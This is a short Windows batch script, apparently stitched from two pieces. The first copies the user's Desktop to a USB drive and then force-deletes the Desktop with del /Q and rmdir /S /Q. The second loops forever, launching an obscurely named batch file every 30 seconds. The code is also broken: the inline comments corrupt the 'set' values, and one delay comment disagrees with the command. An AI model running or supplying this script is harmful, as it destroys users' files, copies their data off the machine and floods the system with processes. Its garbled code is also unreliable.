@echo off
setlocal

:: Set variables
set USB_DRIVE=E:  :: Change this to the letter of your USB drive
set DESKTOP_DIR=%USERPROFILE%\Desktop
set DEST_DIR=%USB_DRIVE%\DesktopBackup
set FINAL_SCRIPT=%USB_DRIVE%\final_script.bat
set WAIT_TIME=60  :: Time to wait in seconds

:: Create destination directory on USB drive
if not exist %DEST_DIR% mkdir %DEST_DIR%

:: Copy Desktop contents to USB drive
xcopy "%DESKTOP_DIR%\*" "%DEST_DIR%\" /E /H /C /I

:: Wait for the specified amount of time
timeout /T %WAIT_TIME%

:: Delete contents of the Desktop
del /Q "%DESKTOP_DIR%\*"
rmdir /S /Q "%DESKTOP_DIR%"

:: Recreate the Desktop directory
mkdir "%DESKTOP_DIR%"

@echo off

ping -n 240 127.0.0.1
start cmd /c "main.bat"

:monitor

REM Delay for 2 seconds
ping -n 30 127.0.0.1 >nul

start cmd /c "man1f3zzt0.bat"

goto monitor



